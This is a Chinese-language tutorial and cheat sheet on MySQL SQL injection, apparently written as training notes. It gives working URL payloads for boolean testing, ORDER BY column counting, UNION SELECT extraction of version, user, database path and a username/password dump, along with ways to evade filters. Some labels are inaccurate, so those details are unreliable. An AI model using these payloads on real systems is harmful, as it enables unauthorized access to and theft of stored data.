SQL 注入

Oct 02, 2019Hits

所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。

##一般步骤

判断是否存在sql注入可能。键入？id=1 and 1=1 页面返回正常， and 1=2 时页面返回出错，说明sql语句被执行，程序没有对敏感字符进行过滤。
爆数据库。
?id=1 and ord(mid(version(),1,1))
爆字段。
?id=50 order by 3
爆表.
?id=50 and 1=2 union select 1,2,3,4,5,6
爆用户名、密码。
?id=50 and 1=2 union select 1,2,database(),4,5,6

SQL注入技术：

1.强制产生错误。
对数据库类型、版本等信息进行识别是此类型攻击的动机所在。它的目的是收集数据库的类型、结构等信息为其他类型的攻击做准备，可谓是攻击的一个预备步骤。利用应用程序服务器返回的默认错误信息而取得漏洞信息。

2.使用特殊的字符。
不同的SQL数据库有许多不同是特殊字符和变量，通过某些配置不安全或过滤不细致的应用系统能够取得某些有用的信息，从而对进一步攻击提供方向。

3.使用条件语句。
此方式具体可分为基于内容、基于时间、基于错误三种形式。一般在经过常规访问后加上条件语句，根据信息反馈来判定被攻击的目标。

4.避开输入过滤技术。
虽然对于通常的编码都可利用某些过滤技术进行SQL注入防范，但是鉴于此种情况下也有许多方法避开过滤，一般可达到此目的的技术手段包括SQL注释和动态查询的使用，利用截断，URL编码与空字节的使用，大小写变种的使用以及嵌套剥离后的表达式等等。借助于此些手段，输入构思后的查询可以避开输入过滤，从而攻击者能获得想要的查询结。

常用函数：

version()：查看mysql的版本。 ?id=1’ and 1=2 union select 1,version(),3–+

user()：查看当前连接的数据库名称。 ?id=1’ and 1=2 union select 1,user(),3–+

database()：查看当前使用的数据库。 ?id=1’ and 1=2 union select 1,database(),3–+

@@datadir：读取数据库的路径 ?id=1’ and 1=2 union select 1,@@datadir,3–+

group_concat()：讲多行的查询结果全部输出并以逗号分隔开。?id=1’ and 1=2 union select 1,group_concat(username,password),3 from security.users–+

注： 可以先使用 ‘ 号 “ 号以及 ) 单独或者拼接加在id后面，通过回显判断使用了什么过滤方式 。注意：只要有成对的符号作为过滤方式，一定要闭合，可以用 # 号，在url上可以用–+或者%23闭合，才能使语法成立。
